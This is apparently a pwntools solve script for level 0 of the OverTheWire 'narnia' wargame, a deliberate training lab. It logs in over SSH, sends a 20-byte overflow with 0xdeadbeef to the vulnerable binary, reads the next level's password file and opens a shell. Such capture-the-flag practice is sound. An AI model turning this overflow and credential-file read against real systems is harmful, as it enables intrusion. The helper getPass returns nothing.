from pwn import *
import subprocess

context.log_level='debug'


level=0
user='narnia' + str(level)
host='narnia.labs.overthewire.org'
password='narnia0'
port=2226


def conn():
    return ssh(user=user, host=host, password=password, port=port)
def getPass(shell):
    print('The password for the next level is...')
    shell.sendline('cat /etc/narnia*/narnia' + str(level+1))
    flag=shell.recvuntil('$').split()[0]
def readCode(shell):
    code=shell.download_data('/narnia/' + user + '.c')
    shell.download_file('/narnia/' + user + '.c')
    log.info('The code for this level is')
    print(code)
    subprocess.call(['rm',user+'.c'])


#context=(arch='i386', os='linux')

sh=conn()
readCode(sh)
exe=sh.run('/narnia/'+user)
exe.recvuntil(':')
payload = 'a'*20 + p32(0xdeadbeef)
exe.sendline(payload)
flag=getPass(exe)
exe.interactive()
